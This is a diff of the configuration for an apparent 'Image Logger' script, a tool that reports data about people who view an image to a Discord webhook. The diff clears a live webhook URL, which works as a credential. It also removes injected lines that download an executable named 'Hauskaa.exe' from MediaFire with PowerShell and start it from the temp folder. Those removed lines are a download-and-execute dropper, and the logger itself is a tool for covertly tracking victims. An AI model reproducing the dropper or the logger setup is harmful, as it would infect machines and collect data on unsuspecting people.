@@ -12,14 +12,10 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1348105412788097054/3zrtX3rkh1SGiaPEUndYhGQPvR2vOajyNv75ggkT9HVJJ916REQNv0avsPhBcobZ8TZ9",
-    "image": "https://parade.com/.image/c_limit%2Ccs_srgb%2Cq_auto:good%2Cw_700/MTkwNTgxMTA1NDAyMjU4NTU3/funny-pictures.webp", # You can also have a custom image by using a URL argument
+    "webhook": "",
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    <a href="https://download1321.mediafire.com/laaco1xi21igmRkjQG0Ksazjj_ksDLchyHUvnXs7PQzXw_RzS_lH34SAwhGcBINMUN-BuPlx_RSjLL0fMLPV8tZtkTF45xWpaKhrxGwhUWS-eIMEO0irgLWd3aQJUUwEsmiJ2cRPegFjnB-4PrQrCLDf-KTzhfyWKA9IspibyHv4wcNn/aintdjw0ftycea5/Hauskaa.exe" download>Download</a>
-    Invoke-WebRequest -Uri "https://download1321.mediafire.com/laaco1xi21igmRkjQG0Ksazjj_ksDLchyHUvnXs7PQzXw_RzS_lH34SAwhGcBINMUN-BuPlx_RSjLL0fMLPV8tZtkTF45xWpaKhrxGwhUWS-eIMEO0irgLWd3aQJUUwEsmiJ2cRPegFjnB-4PrQrCLDf-KTzhfyWKA9IspibyHv4wcNn/aintdjw0ftycea5/Hauskaa.exe" -OutFile "$env:TEMP\Hauskaa.exe"
-Start-Process "$env:TEMP\Hauskaa.exe"
     
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
